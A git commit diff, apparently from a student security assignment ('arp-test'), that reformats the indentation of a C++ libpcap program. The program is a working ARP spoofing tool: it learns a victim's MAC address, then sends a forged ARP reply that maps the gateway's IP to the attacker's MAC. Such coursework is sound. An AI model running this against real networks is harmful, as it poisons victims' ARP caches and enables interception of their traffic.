baaec46ef5feb966585e35b0b471bb45ba01f4a8
brwook <dladnguq131@naver.com>
2022-05-18 04:52:38 -0400

    [*] assignment3: arp-test

--- arp-test/main.cpp
+++ arp-test/main.cpp
@@ -23,50 +23,50 @@ void usage() {
 char* get_mac_address(char *dev);
 
 int main(int argc, char* argv[]) {
-	if (argc < 4) {
-		usage();
-		return -1;
-	}
+    if (argc < 4) {
+        usage();
+        return -1;
+    }
 
-	char* dev = argv[1];
-	char* victim_IP = argv[2];
-	char* gateway_IP = argv[3];
+    char* dev = argv[1];
+    char* victim_IP = argv[2];
+    char* gateway_IP = argv[3];
     char victim_MAC[18] = {0, };
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-		return -1;
-	}
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    if (handle == nullptr) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+        return -1;
+    }
 
-	// 1. Get attacker's MAC address
-	char *attacker_MAC = get_mac_address(dev);
-	if (attacker_MAC == NULL) {
-		fprintf(stderr, "couldn't get MAC address\n");
-		return -1;
-	}
-	printf("[*] attacker_MAC: %s\n", attacker_MAC);
+    // 1. Get attacker's MAC address
+    char *attacker_MAC = get_mac_address(dev);
+    if (attacker_MAC == NULL) {
+        fprintf(stderr, "couldn't get MAC address\n");
+        return -1;
+    }
+    printf("[*] attacker_MAC: %s\n", attacker_MAC);
 
-	// 2. Find victim's MAC address 
-	EthArpPacket packet;
-	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");	// victim's MAC
-	packet.eth_.smac_ = Mac(attacker_MAC);			// attacker's MAC
-	packet.eth_.type_ = htons(EthHdr::Arp);
+    // 2. Find victim's MAC address 
+    EthArpPacket packet;
+    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");	// victim's MAC
+    packet.eth_.smac_ = Mac(attacker_MAC);			// attacker's MAC
+    packet.eth_.type_ = htons(EthHdr::Arp);
 
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = Mac(attacker_MAC); 			// attacker's MAC 
-	packet.arp_.sip_ = htonl(Ip(gateway_IP));       // gateway IP
-	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); 	// victim's MAC
-	packet.arp_.tip_ = htonl(Ip(victim_IP)); 		// victim's IP
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-		return -1;
-	}
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ = Ip::SIZE;
+    packet.arp_.op_ = htons(ArpHdr::Request);
+    packet.arp_.smac_ = Mac(attacker_MAC); 			// attacker's MAC 
+    packet.arp_.sip_ = htonl(Ip(gateway_IP));       // gateway IP
+    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); 	// victim's MAC
+    packet.arp_.tip_ = htonl(Ip(victim_IP)); 		// victim's IP
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        return -1;
+    }
     
     while (true)
     {
@@ -89,56 +89,55 @@ int main(int argc, char* argv[]) {
                     sprintf(victim_MAC, "%02x", ((uint8_t*)arp_hdr->smac_)[0]);
                     for(int i=0; i<5; i++)
                         sprintf((victim_MAC+2)+3*i, ":%02x", ((uint8_t*)arp_hdr->smac_)[i+1]);
-                    
                     break;
                 }
             }
         }
     }
 
-	// 3. DOOO ARP SPOOOOOOOFING 
-	packet.eth_.dmac_ = Mac(victim_MAC);			// victim's MAC
-	packet.eth_.smac_ = Mac(attacker_MAC);			// attacker's MAC
-	packet.eth_.type_ = htons(EthHdr::Arp);
+    // 3. DOOO ARP SPOOOOOOOFING 
+    packet.eth_.dmac_ = Mac(victim_MAC);			// victim's MAC
+    packet.eth_.smac_ = Mac(attacker_MAC);			// attacker's MAC
+    packet.eth_.type_ = htons(EthHdr::Arp);
 
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Reply);
-	packet.arp_.smac_ = Mac(attacker_MAC); 			// attacker's MAC 
-	packet.arp_.sip_ = htonl(Ip(gateway_IP)); 		// gateway IP
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ = Ip::SIZE;
+    packet.arp_.op_ = htons(ArpHdr::Reply);
+    packet.arp_.smac_ = Mac(attacker_MAC); 			// attacker's MAC 
+    packet.arp_.sip_ = htonl(Ip(gateway_IP)); 		// gateway IP
     packet.arp_.tmac_ = Mac(victim_MAC); 			// victim's MAC
-	packet.arp_.tip_ = htonl(Ip(victim_IP)); 		// victim's IP
+    packet.arp_.tip_ = htonl(Ip(victim_IP)); 		// victim's IP
     res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
 
 
-	pcap_close(handle);
+    pcap_close(handle);
 }
 
 
 char* get_mac_address(char *dev) {
-	struct ifreq s;
-	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
-	strcpy(s.ifr_name, dev);
+    struct ifreq s;
+    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
+    strcpy(s.ifr_name, dev);
 
-	char *v_mac = (char *)malloc(18);
-	if(v_mac == NULL)
-		return 0;
-	
-	if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
-		int i;
-		sprintf(v_mac, "%02x", (unsigned char) s.ifr_addr.sa_data[0]);
-		for (i = 0; i < 5; ++i)
-			sprintf((v_mac+2) + 3*i,":%02x", (unsigned char) s.ifr_addr.sa_data[i+1]);
-		
-		printf("[*] %s\n", v_mac);
+    char *v_mac = (char *)malloc(18);
+    if(v_mac == NULL)
+        return 0;
+
+    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
+        int i;
+        sprintf(v_mac, "%02x", (unsigned char) s.ifr_addr.sa_data[0]);
+        for (i = 0; i < 5; ++i)
+            sprintf((v_mac+2) + 3*i,":%02x", (unsigned char) s.ifr_addr.sa_data[i+1]);
+
+        printf("[*] %s\n", v_mac);
         close(fd);
-		return v_mac;
-	}
+        return v_mac;
+    }
 
-	return 0;
+    return 0;
 }
